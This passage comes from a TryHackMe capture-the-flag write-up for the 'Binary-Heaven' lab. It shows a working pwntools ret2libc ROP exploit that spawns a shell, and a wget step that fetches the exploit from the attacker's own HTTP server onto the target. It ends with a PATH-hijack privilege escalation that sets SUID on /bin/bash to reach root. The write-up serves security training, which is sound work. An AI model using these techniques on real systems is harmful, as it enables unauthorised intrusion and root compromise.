Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Binexgod said he want to make this easy.
System is at: 0xf7c47040
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
[...]
──────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7e229c0  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffceb0  →  0xffffce00  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x0       
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
```

This time, we can see that **the `EIP` register is overflowed with 4 B's!**

- Next, since we can't use shellcode (NX enabled), we need find something that spawns a shell:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ./pwn_me
Binexgod said he want to make this easy.
System is at: 0xf7c47040
^C
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ./pwn_me
Binexgod said he want to make this easy.
System is at: 0xf7c47040
^C

```

**When we run the binary, it prints out an address: `0xf7c47040`. Each time we run it, this address will be the same.**

Normally, this address will be the leaked via bypassing ASLR. 

**Also, this binary is using the `libc.so.6` libc library to run:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ldd ./pwn_me
	linux-gate.so.1 (0xf7f99000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
	/lib/ld-linux.so.2 (0xf7f9b000)
```

Armed with the above informaton, **what if we use that library to spawn a shell via ROP chain?**

> Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things. (Source: [ctf101](https://ctf101.org/binary-exploitation/return-oriented-programming/))

To do so, I'll write a [python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Binary-Heaven/pwn_me_exploit.py):

```py
#!/usr/bin/env python3

from pwn import *

offset = 32
padding = b'A' * offset

elf = context.binary = ELF('./pwn_me')
libc = elf.libc

def main():
	with process() as p:
		# Get system address in hex
		p.recvuntil(b'System is at: ')
		system_address = int(p.recv(), 16)
		log.success('System address: {}'.format(system_address))

		# Set our libc address to the system address
		libc.address = system_address - libc.sym['system']
		log.success('libc address: {}'.format(libc.address))

		# Get the address of /bin/sh from libc
		shell = next(libc.search(b'/bin/sh'))
		log.success('/bin/sh address: {}'.format(shell))

		# ROP chain
		rop = ROP(libc)
		rop.raw(padding)
		rop.system(shell)

		# Send the ROP chain
		p.sendline(rop.chain())
		log.success('Sending payload: {}'.format(rop.chain()))

		# Change to interactive shell
		try:
			p.interactive()
		except:
			log.failure('Failed to spawn an interactive shell')

if __name__ == '__main__':
	main()
```

**Local testing:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# python3 pwn_me_exploit.py               
[*] '/root/ctf/thm/ctf/Binary-Heaven/pwn_me'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/root/ctf/thm/ctf/Binary-Heaven/pwn_me': pid 56513
[+] System address: 4156846144
[+] libc address: 4156555264
[+] /bin/sh address: 4158341326
[*] Loaded 164 cached gadgets for '/usr/lib/i386-linux-gnu/libc.so.6'
[+] Sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@p\xc4\xf7jaaa\xce@\xdb\xf7'
[*] Switching to interactive mode
$ whoami;id
root
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),142(kaboxer)
$ 
[*] Interrupted
[*] Stopped process '/root/ctf/thm/ctf/Binary-Heaven/pwn_me' (pid 56513)
```

Successfully spawns a interactive shell!

**Let's transfer this python script to the target machine!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

guardian@heaven:~$ wget http://10.9.0.253/pwn_me_exploit.py
```

```
guardian@heaven:~$ python3 pwn_me_exploit.py 
[*] '/home/guardian/pwn_me'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib32/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/guardian/pwn_me': pid 3114
[+] System address: 4158482768
[+] libc address: 4158242816
[+] /bin/sh address: 4159656203
[*] Loaded 148 cached gadgets for '/lib32/libc-2.23.so'
[+] Sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPi\xdd\xf7jaaa\x0bQ\xef\xf7'
[*] Switching to interactive mode
$ whoami;hostname;id;ip a
binexgod
heaven
uid=1002(binexgod) gid=1001(guardian) groups=1001(guardian)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:7a:bb:2e:ce:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.124.63/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::7a:bbff:fe2e:ce71/64 scope link 
       valid_lft forever preferred_lft forever
```

**I'm user `binexgod`!**

**binexgod_flag.txt:**
```
$ cat /home/binexgod/binexgod_flag.txt
THM{Redacted}
```

### binexgod to root

**In the home directory of `binexgod`, there is a binary with SUID sticky bit called `vuln`:**
```
$ ls -lah /home/binexgod
[...]
-rwsr-xr-x  1 root     binexgod 8.7K Mar 15  2021 vuln
-rwxr-xr--  1 root     binexgod  327 Mar  8  2021 vuln.c

$ file /home/binexgod/vuln
/home/binexgod/vuln: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5a6f0108a2b7324107c80bd42e5789a8478470ec, not stripped
```

**/home/binexgod/vuln.c:**
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

**If you look at the `echo` command, it's not using the absolute path, which can be abused to escalate to root!**

**To exploit relative path, I'll:**

- Create a fake `echo` script:

```
$ cat << EOF > /tmp/echo
$ chmod +s /bin/bash
$ EOF
```

This script will add a SUID sticky bit to `/bin/bash`.

- Mark it as executable:

```
$ chmod +x /tmp/echo

$ ls -lah /tmp/echo
-rwxrwxr-x 1 binexgod guardian 19 Oct 20 07:27 /tmp/echo
```

- Export a new path environment variable:

```
$ export PATH=/tmp:$PATH
```

- Run the `vuln` binary in `/tmp`:

```
$ cd /tmp;/home/binexgod/vuln

$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

We successfully added SUID sticky bit to `/bin/bash`!

**Let's spawn a bash shell with SUID privilege!**
```
$ /bin/bash -p
$ whoami;hostname;id;ip a
root
heaven
uid=1002(binexgod) gid=1001(guardian) euid=0(root) egid=0(root) groups=0(root),1001(guardian)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:7a:bb:2e:ce:71 brd ff:ff:ff:ff:ff:ff
    inet 10.10.124.63/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::7a:bbff:fe2e:ce71/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
$ cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Reverse Engineering Linux ELF 64-bit LSB Executable
2. Stack Buffer Overflow With ROP Chaining
3. Privilege Escalation via Exploiting Relative Path